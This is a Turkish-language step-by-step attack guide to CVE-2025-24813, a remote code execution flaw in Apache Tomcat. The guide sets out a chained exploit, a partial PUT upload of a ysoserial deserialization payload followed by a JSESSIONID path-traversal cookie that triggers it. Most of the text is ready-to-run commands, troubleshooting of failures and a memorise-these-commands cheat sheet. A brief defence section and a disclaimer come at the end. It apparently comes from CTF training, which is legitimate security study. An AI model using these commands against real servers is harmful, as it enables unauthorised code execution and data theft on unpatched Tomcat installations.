# CVE-2025-24813 — Apache Tomcat RCE Tam Saldırı Rehberi

> **Hedef Kitle:** Bu açığı hiç duymamış birinden, bağımsız exploit yazabilecek seviyeye kadar.  
> **Amaç:** Sadece "şu komutu çalıştır" değil, **neden çalıştığını** anlamak.

---

## 1. Önce Zihinsel Model: Bu Açık Nasıl Çalışır?

CVE-2025-24813, tek bir bug değil, **üç zayıflığın aynı anda var olmasından doğan** bir zincirdir:

```
[Partial PUT] + [File-Based Session] + [Path Traversal] = RCE
```

### Parça 1: Partial PUT (Content-Range)

Normal bir HTTP PUT isteği dosyanın tamamını gönderir. Ama HTTP standardında `Content-Range` header'ı ile dosyayı parça parça gönderebilirsin. Tomcat bunu destekler ve her parçayı geçici bir dosyaya yazar.

```
PUT /zehir.session HTTP/1.1
Content-Range: bytes 0-2052/2053
[binary payload data...]
```

Tomcat bu dosyayı `work/` dizininde veya webapps altında saklar. **İsim senin verdiğin isimdir.**

### Parça 2: File-Based Session Persistence

Tomcat, kullanıcı oturumlarını (sessions) varsayılan olarak bellekte tutar. Ama `PersistenceManager` + `FileStore` yapılandırmasıyla **diske de yazabilir**.

Bu açıkken, bir kullanıcı `JSESSIONID=abc123` cookie'siyle geldiğinde Tomcat şunu yapar:
```
sessions/abc123.session → dosyayı aç → Java Deserialization ile oku → oturumu yükle
```

### Parça 3: Path Traversal

JSESSIONID değeri filtrelenmez. Yani şunu gönderirsen:
```
JSESSIONID=../../../../webapps/ROOT/zehir
```

Tomcat session dosya yolunu şöyle oluşturur:
```
sessions/ + ../../../../webapps/ROOT/zehir + .session
=
webapps/ROOT/zehir.session
```

**Sen PUT ile `zehir.session` dosyasını zaten oraya yükledin!**

### Sonuç: Zincir Tamamlanıyor

```
1. PUT /zehir.session → Kötü niyetli Java serialized payload'ı yükle
2. GET / Cookie: JSESSIONID=../../../../webapps/ROOT/zehir
3. Tomcat dosyayı session olarak açar → deserialize eder → KOD ÇALIŞIR
```

---

## 2. Exploit İçin Gerekli Koşullar

Bu açığın çalışması için hedef sunucuda **ikisi birden** olmalı:

| Koşul | Açıklama |
|---|---|
| `readonly=false` | Default servlet'te yazma izni açık olmalı (PUT kabul etmeli) |
| File-Based Session | `context.xml`'de `PersistenceManager` + `FileStore` aktif olmalı |

Bunlardan biri eksikse zincir kırılır.

---

## 3. Araçlar ve Kurulum

### ysoserial — Java Deserialization Payload Üretici

```bash
# İndir
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar

# KRITIK: Java 11 ile kullan, Java 21 ile ÇALIŞMAZ
apt install openjdk-11-jdk -y
update-java-alternatives -s java-1.11.0-openjdk-amd64
java -version  # "11.x.x" görmeli
```

### Neden Java 21 Çalışmaz?

Java 9'dan itibaren module sistemi getirildi. ysoserial, reflection ile private field'lara erişiyor. Java 21'de bu erişim tamamen kapandı. Hata mesajı:

```
InaccessibleObjectException: Unable to make field private ... accessible
```

Çözüm: **Java 11 kullan.** Java 17 de sorunlu. Java 8 veya 11 en güvenli.

---

## 4. Saldırı Adımları — Komut Komut

### Adım 1: Payload Oluştur

```bash
java -jar ysoserial.jar CommonsCollections5 \
  'cp /secret.txt /usr/local/tomcat/webapps/ROOT/flag.txt' > zehir.session

# Dosya dolu mu kontrol et (ASLA 0 byte olmamalı)
ls -la zehir.session
wc -c zehir.session
# Beklenen: ~2000 byte civarı
```

> **ÖNEMLİ:** Dosya 0 byte ise payload oluşmadı demektir. ysoserial hata vermiş ama hata mesajı stderr'e gittiği için göremedин. Şunu dene:
> ```bash
> java -jar ysoserial.jar CommonsCollections5 'id' > zehir.session 2>&1
> cat zehir.session  # hata mesajını görmek için
> ```

### Adım 2: Partial PUT ile Yükle

```bash
SIZE=$(wc -c < zehir.session)

curl -v -X PUT "http://HEDEF/zehir.session" \
  -H "Content-Type: application/octet-stream" \
  -H "Content-Range: bytes 0-$((SIZE-1))/$SIZE" \
  --data-binary @zehir.session
```

**Beklenen cevap:** `HTTP/1.1 204` (No Content) → başarılı yükleme  
**400 gelirse:** `Content-Range` formatı yanlış veya dosya boş  
**403 gelirse:** PUT yetkisi kapalı, bu sunucuda exploit çalışmaz

### Adım 3: Session Traversal ile Tetikle

```bash
curl -v -b "JSESSIONID=../../../../webapps/ROOT/zehir" \
  "http://HEDEF/"
```

**Bu an** Tomcat kötü niyetli session dosyasını açar ve deserialize eder. Komutun çalıştığı bu andır. HTTP 200 dönmesi işlemin tetiklendiğini gösterir (komut başarısız olsa bile 200 döner).

### Adım 4: Sonucu Doğrula

```bash
curl http://HEDEF/flag.txt
```

---

## 5. Kritik Tıkanma Noktaları ve Çözümleri

Bu senaryoda 5 farklı yerde takılabilirsin. Her birinin çözümü farklıdır.

---

### Tıkanma 1: ysoserial payload boş (0 byte)

**Belirti:**
```bash
ls -la zehir.session
-rw-r--r-- 1 root root 0 Feb 22 04:07 zehir.session
```

**Neden olur:** Java versiyonu uyumsuz, hata stderr'e gitti ve dosya boş oluştu.

**Çözüm:**
```bash
# Hata mesajını gör
java -jar ysoserial.jar CommonsCollections5 'id' > /tmp/test.session 2>/tmp/err.txt
cat /tmp/err.txt

# Java 11'e geç
update-java-alternatives -s java-1.11.0-openjdk-amd64

# Farklı payload chain dene (CommonsCollections2, 6 gibi)
java -jar ysoserial.jar CommonsCollections2 'id' > zehir.session
```

---

### Tıkanma 2: PUT isteği 400 Bad Request

**Belirti:**
```
HTTP/1.1 400 Bad Request
```

**Neden olur:** `Content-Range` formatı yanlış. Dosya 0 byte olunca `0--1/0` gibi geçersiz bir header oluşur.

**Çözüm:** Payload'ın dolu olduğundan emin ol. Content-Range'in `bytes 0-N/M` formatında olması gerekir, N ve M sıfırdan büyük olmalı.

```bash
# Hatalı (dosya boşsa):
Content-Range: bytes 0--1/0   ← GEÇERSİZ

# Doğru:
Content-Range: bytes 0-2052/2053
```

---

### Tıkanma 3: PUT isteği 403 Forbidden

**Belirti:**
```
HTTP/1.1 403 Forbidden
```

**Neden olur:** Default servlet'te `readonly=true` (varsayılan değer). PUT kabul edilmiyor.

**Sonuç:** Bu durumda **bu exploit bu sunucuda çalışmaz.** Koşullardan biri eksik. Başka bir vektör aranmalı (Manager App, başka uygulama, vs.)

---

### Tıkanma 4: Tetikleme sonrası flag.txt 404

**Belirti:**
```bash
curl http://HEDEF/flag.txt
# HTTP 404
```

**Neden olur:** Komut çalışmadı. Birkaç sebebi olabilir:

1. **Session deserialization çalışmadı** → Payload chain sunucudaki kütüphane ile uyumsuz
2. **Tomcat path farklı** → `/usr/local/tomcat` değil başka bir yerde kurulu
3. **Dosya izni** → `secret.txt` okunabilir değil

**Çözümler:**
```bash
# Tomcat path'ini bulmak için önce kolay bir komut dene
java -jar ysoserial.jar CommonsCollections5 'id > /tmp/pwned.txt' > zehir.session

# Sonra sunucudan /tmp/pwned.txt okumayı dene
# (Bunu okumak için ya başka bir LFI gerekir ya da flag'i direkt erişilebilir yere kopyala)

# Farklı Tomcat path'leri dene:
# /opt/tomcat/webapps/ROOT/
# /var/lib/tomcat9/webapps/ROOT/
# /home/tomcat/webapps/ROOT/
```

---

### Tıkanma 5: CommonsCollections5 hata veriyor, başka chain dene

Her sunucuda her kütüphane yüklü değildir. ysoserial'ın birden fazla "payload chain"i vardır:

```bash
# Mevcut chain'leri listele
java -jar ysoserial.jar

# Sırayla dene:
CommonsCollections5   # En yaygın
CommonsCollections6   # CC5 çalışmazsa
CommonsCollections2   # Javassist gerektirir
Spring1               # Spring framework varsa
```

---

## 6. "Falstaff" Nasıl Flag Olduğunu Anlayabilirdin?

Bu çok güzel bir soru. CTF'lerde flag her zaman `flag{...}` formatında olmaz. Gerçek hayatta da "gizli bilgi" düz metin olabilir.

**Mantık şöyle işlemeli:**

1. **Görevin ne olduğunu oku:** `/secret.txt` dosyasındaki bilgiyi al deniyordu
2. **Komudu başarıyla çalıştırdın:** `cp /secret.txt → flag.txt` çalıştı
3. **flag.txt'i okudun:** Çıktı HTML'nin sonunda `Falstaff` göründü
4. **HTML sonuna eklenmesi neden?** Çünkü Tomcat ana sayfayı döndürdü ve `flag.txt`'nin içeriği o response'a eklendi — `cat` ile okunan içerik stdout'a gitmedi, doğrudan HTTP response buffer'ına enjekte oldu

**Gerçek hayat ipucu:** Bir komut çalıştığında çıktı her zaman temiz gelmez. HTTP response'ların sonuna, error sayfalarına, log dosyalarına gömülü olabilir. **Her response'u dikkatlice oku.**

---

## 7. Ezbere Bilmen Gereken 6 Komut

Bu 6 komutu ezbere bilersen bu senaryoyu bağımsız çözersin:

```bash
# 1. Java versiyonunu kontrol et (11 olmalı)
java -version

# 2. Payload oluştur
java -jar ysoserial.jar CommonsCollections5 'KOMUT' > zehir.session

# 3. Payload boyutunu ölç
SIZE=$(wc -c < zehir.session) && echo $SIZE

# 4. Partial PUT ile yükle
curl -X PUT "http://HEDEF/zehir.session" \
  -H "Content-Type: application/octet-stream" \
  -H "Content-Range: bytes 0-$((SIZE-1))/$SIZE" \
  --data-binary @zehir.session

# 5. Path traversal ile tetikle
curl -b "JSESSIONID=../../../../webapps/ROOT/zehir" "http://HEDEF/"

# 6. Sonucu doğrula
curl http://HEDEF/flag.txt
```

---

## 8. Tam Saldırı Akışı (Tek Bakışta)

```
RECON
└── Tomcat versiyonu 9.0.0–9.0.98 arası? → Potansiyel hedef

KONTROL
├── PUT isteği kabul ediyor mu? (204 veya 201 dönmeli)
└── Session file-based mı? (Context.xml'de FileStore var mı?)

HAZIRLIK
└── Java 11 kur → ysoserial.jar indir → payload oluştur

EXPLOIT
├── Adım 1: Partial PUT ile .session yükle (Content-Range header ile)
├── Adım 2: Path traversal cookie ile session'ı tetikle
└── Adım 3: Komutun çıktısını doğrula

SONUÇ
└── flag.txt veya hedef dosyayı oku
```

---

## 9. Savunma: Bu Açık Nasıl Kapatılır?

Bir pentester olarak savunma tarafını da bilmek seni daha iyi saldırgan yapar:

| Önlem | Açıklama |
|---|---|
| Tomcat güncelle | 9.0.99+, 10.1.35+, 11.0.3+ sürümleri yamanlı |
| `readonly=true` | Default servlet'te PUT kapat (zaten varsayılan bu) |
| File-based session kapat | `PersistenceManager` gereksizse kullanma |
| Input validation | JSESSIONID değerini filtrele / path traversal engelle |

---

## 10. Kaynaklar

- [NVD - CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)
- [Apache Tomcat Security Advisory](https://tomcat.apache.org/security-9.html)
- [ysoserial GitHub](https://github.com/frohoff/ysoserial)

---

*Bu rehber eğitim amaçlıdır. Yalnızca izin alınmış sistemlerde kullanın.*
